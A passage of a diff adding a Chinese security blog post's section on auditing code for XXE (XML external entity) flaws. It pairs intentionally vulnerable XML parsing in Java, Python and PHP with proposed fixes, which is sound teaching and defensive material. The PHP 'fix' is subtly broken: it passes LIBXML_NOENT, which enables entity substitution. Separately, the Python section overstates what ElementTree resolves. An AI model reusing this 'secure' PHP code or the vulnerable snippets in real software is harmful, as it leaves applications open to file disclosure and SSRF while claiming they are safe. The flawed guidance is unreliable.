class="variable">doc</span> <span class="operator">=</span> builder.parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;input.xml&quot;</span>));</span><br><span class="line">        System.out.println(doc.getDocumentElement().getNodeName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>问题：DocumentBuilderFactory 默认允许加载外部实体，攻击者可通过构造恶意 XML 触发 XXE。</p>
+<p>安全的做法是在 DocumentBuilderFactory 上调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁用 DTD 和外部实体</span></span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setXIncludeAware(<span class="literal">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;input.xml&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>如果这类特性未设置（或设置为 true 反而表示开启实体），则易遭受 XXE 攻击  。此外，Spring、Struts2 等框架如果使用 XML 配置或解析，也要关注其底层是否使用了安全配置。</p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Python 标准库如 xml.etree.ElementTree 默认会解析外部实体，容易产生 XXE。推荐使用 defusedxml 等安全库来解析。审计时可检查是否使用了类似 XMLParser(resolve_entities&#x3D;False) 的参数或使用 DefusedXMLParser。</p>
+<p>存在漏洞的情况：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_xml</span>(<span class="params">xml_file</span>):</span><br><span class="line">    <span class="comment"># 默认的 ElementTree 允许实体展开（Python &lt; 3.7）</span></span><br><span class="line">    tree = ET.parse(xml_file)</span><br><span class="line">    root = tree.getroot()</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">parse_xml(<span class="string">&quot;input.xml&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>示例修复代码，使用 defusedxml 库，它对 XXE、Billion Laughs 攻击等做了防御：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> defusedxml.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_xml</span>(<span class="params">xml_file</span>):</span><br><span class="line">    <span class="comment"># ✅ 使用安全库</span></span><br><span class="line">    tree = ET.parse(xml_file)</span><br><span class="line">    root = tree.getroot()</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">parse_xml(<span class="string">&quot;input.xml&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>PHP 中默认会加载外部实体且早期版本可以用 libxml_disable_entity_loader() 来关闭实体解析。审计时检查是否调用了 libxml_disable_entity_loader(true)，或者在调用 simplexml_load_string、DOMDocument::loadXML 时使用 LIBXML_NONET、LIBXML_NOENT、LIBXML_NOCDATA 等常量限制。</p>
+<p>存在漏洞的情况</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;input.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DOMDocument 默认允许外部实体</span></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以在 input.xml 里插入外部实体，触发 XXE。</p>
+<p>修复写法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;input.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="comment">// 禁用外部实体解析</span></span><br><span class="line"><span class="variable">$dom</span>-&gt;resolveExternals = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$dom</span>-&gt;substituteEntities = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="其他语言"><a href="#其他语言" class="headerlink" title="其他语言"></a>其他语言</h3><p>.NET、Ruby、Node.js 等语言同样需要检查 XML 解析配置。例如，在 .NET 中可以设置 XmlReaderSettings.DtdProcessing &#x3D; DtdProcessing.Prohibit；在 Node.js 则避免使用不安全的 xmldom 或 xml2js 默认解析；在 Ruby 中使用 REXML 时可调用 REXML::Document.new(xml, {entity_expansion: 0}) 等。总体思路是一致的：检查解析器是否禁用了 DTD 和外部实体  ，若没有则可视为潜在的 XXE 风险。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yosheep.github.io">YoSheep</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yosheep.github.io/posts/105b1196.html">https://yosheep.github.io/posts/105b1196.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yosheep.github.io" target="_blank">YoSheep's 学习笔记</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WEB/">WEB</a><a class="post-meta__tags" href="/tags/XXE/">XXE</a></div><div class="post_share"><div class="social-share" data-image="/img/yeah_circle.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/b1433c19.html" title="Java安全篇(2)-ysoserial使用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Java安全篇(2)-ysoserial使用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/14897.html" title="HTTP API授权认证：服务器的灵魂三问——你是谁？你要干啥？你能干啥？"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="title">HTTP API授权认证：服务器的灵魂三问——你是谁？你要干啥？你能干啥？</div></div></a></div><div><a href="/posts/17013.html" title="PHP反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-18</div><div class="title">PHP反序列化</div></div></a></div><div><a href="/posts/affd600b.html" title="Java安全学习(1)-Java反序列化基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-22</div><div class="title">Java安全学习(1)-Java反序列化基础</div></div></a></div><div><a href="/posts/691d1762.html" title="RCE之常见绕过方式"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-21</div><div class="title">RCE之常见绕过方式</div></div></a></div><div><a href="/posts/12b7d7b4.html" title="Python Pickle 反序列化漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-12</div><div class="title">Python Pickle 反序列化漏洞</div></div></a></div><div><a href="/posts/6157ec5d.html" title="RCE之无字母数字RCE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-23</div><div class="title">RCE之无字母数字RCE</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/yeah_circle.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">YoSheep</div><div class="author-info__description">欢迎各位师傅交流学习</br>vx: sunny下划线yosheep</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/YoSheep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yosheep" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:sunny_cxw@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">佬说：“搞安全的，技术不重要，重要的是要会想。”</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E6%A0%B8%E5%BF%83%E8%AF%AD%E6%B3%95%EF%BC%9A%E5%AE%9E%E4%BD%93%E3%80%81DOCTYPE-%E4%B8%8E-CDATA"><span class="toc-number">1.</span> <span class="toc-text">XML核心语法：实体、DOCTYPE 与 CDATA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">XXE 攻击示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC-XXE%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">基本 XXE（文件读取）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-XXE%EF%BC%88Out-of-Band-%E6%B8%A0%E9%81%93%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">盲注 XXE（Out-of-Band 渠道）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%A4%96%E9%83%A8%E5%8D%8F%E8%AE%AE%EF%BC%88SSRF%EF%BC%89%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">基于外部协议（SSRF）利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.4.</span> <span class="toc-text">其他利用方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E8%AF%86%E5%88%ABXXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">代码审计：识别XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-number">3.1.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">3.2.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">3.3.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80"><span class="toc-number">3.4.</span> <span class="toc-text">其他语言</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/105b1196.html" title="XML 外部实体注入（XXE）漏洞基本原理">XML 外部实体注入（XXE）漏洞基本原理</a><time datetime="2025-08-24T11:40:38.000Z" title="发表于 2025-08-24 19:40:38">2025-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b1433c19.html" title="Java安全篇(2)-ysoserial使用">Java安全篇(2)-ysoserial使用</a><time datetime="2025-08-23T13:56:54.000Z" title="发表于 2025-08-23 21:56:54">2025-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/affd600b.html" title="Java安全学习(1)-Java反序列化基础">Java安全学习(1)-Java反序列化基础</a><time datetime="2025-08-22T14:47:19.000Z" title="发表于 2025-08-22 22:47:19">2025-08-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/12b7d7b4.html" title="Python Pickle 反序列化漏洞">Python Pickle 反序列化漏洞</a><time datetime="2025-08-12T06:46:34.000Z" title="发表于 2025-08-12 14:46:34">2025-08-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/16f3418.html" title="安卓开发基础学习">安卓开发基础学习</a><time datetime="2025-08-09T15:16:12.000Z" title="发表于 2025-08-09 23:16:12">2025-08-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By YoSheep</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'iSjR5V9ZIytpvfNU137OlQGH-gzGzoHsz',
+      appKey: '9jj4DuX9kTm6wiDHKR1Llu7T',
+      avatar: 'monsterid',
+      serverURLs: 'https://isjr5v9z.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
